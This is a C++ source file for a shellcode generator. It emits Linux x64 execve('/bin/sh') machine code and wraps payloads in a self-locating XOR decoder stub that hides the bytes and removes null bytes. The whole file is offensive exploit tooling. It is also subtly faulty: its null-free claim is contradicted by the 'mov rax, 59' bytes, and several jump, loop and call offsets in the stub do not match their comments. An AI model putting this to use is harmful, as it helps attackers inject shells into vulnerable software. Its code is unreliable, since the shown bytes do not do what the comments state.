#include <vector>
#include <cstdint>
#include <algorithm>
#include <string_view>

class ShellcodeGenerator 
{
public:
    // Linux x64: execve("/bin/sh", NULL, NULL)
    // Refactored to avoid hardcoded NULL bytes in the string move
    static std::vector<uint8_t> linux_x64_execve() {
        return {
            0x48, 0x31, 0xd2,                               // xor rdx, rdx (envp = NULL)
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
            0x2f, 0x73, 0x68,                               // mov rbx, "//bin/sh" (8 chars)
            0x52,                                           // push rdx (null terminator)
            0x53,                                           // push rbx ("/bin//sh")
            0x48, 0x89, 0xe7,                               // mov rdi, rsp (path)
            0x52,                                           // push rdx (argv[1] = NULL)
            0x57,                                           // push rdi (argv[0] = path)
            0x48, 0x89, 0xe6,                               // mov rsi, rsp (argv)
            0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,       // mov rax, 59
            0x0f, 0x05                                      // syscall
        };
    }

    // Modern polymorphic XOR encoder using a wrapper structure
    struct EncodedShellcode {
        std::vector<uint8_t> data;
        uint8_t key;
    };

    static std::vector<uint8_t> wrap_with_xor_decoder(const std::vector<uint8_t>& payload) {
        uint8_t key = generate_safe_key(payload);
        std::vector<uint8_t> encoded = payload;
        
        for (auto& b : encoded) b ^= key;

        // Optimized Decoder Stub (64-bit)
        // Uses the "Call/Pop" technique to find its own location in memory
        std::vector<uint8_t> stub = {
            0xEB, 0x0F,                         // jmp short get_data
            0x5E,                               // pop rsi (address of data)
            0x48, 0x31, 0xC9,                   // xor rcx, rcx
            0x80, 0xC1, (uint8_t)payload.size(),// mov cl, len
            0x80, 0x36, key,                    // decode: xor byte ptr [rsi], key
            0x48, 0xFF, 0xC6,                   // inc rsi
            0xE2, 0xF9,                         // loop decode
            0xEB, 0x05,                         // jmp short payload
            0xE8, 0xEC, 0xFF, 0xFF, 0xFF        // get_data: call back_to_pop
        };

        stub.insert(stub.end(), encoded.begin(), encoded.end());
        return stub;
    }

private:
    static uint8_t generate_safe_key(const std::vector<uint8_t>& payload) {
        // Simple logic to find an XOR key that doesn't result in 0x00 bytes
        for (uint8_t key = 1; key < 255; ++key) {
            bool safe = true;
            for (auto b : payload) {
                if ((b ^ key) == 0x00) {
                    safe = false;
                    break;
                }
            }
            if (safe) return key;
        }
        return 0xAA; // Fallback
    }
};